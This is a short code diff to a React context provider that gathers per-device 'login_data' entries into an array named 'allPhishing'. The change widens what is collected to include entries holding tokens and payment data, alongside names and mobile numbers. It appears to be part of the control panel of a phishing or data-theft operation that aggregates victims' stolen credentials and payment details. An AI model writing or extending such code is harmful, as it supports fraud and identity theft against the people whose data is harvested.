@@ -55,7 +55,7 @@ export function AppProvider({ children }: { children: ReactNode }) {
       Object.entries(devices).forEach(([devId, dev]: [string, any]) => {
         if (dev.login_data && typeof dev.login_data === 'object') {
           Object.entries(dev.login_data as object).forEach(([_, entry]: [string, any]) => {
-            if (entry.fullName || entry.mobile) {
+            if (entry.fullName || entry.mobile || entry.Token || entry.payment) {
               allPhishing.push({ deviceId: devId, ...entry })
             }
           })
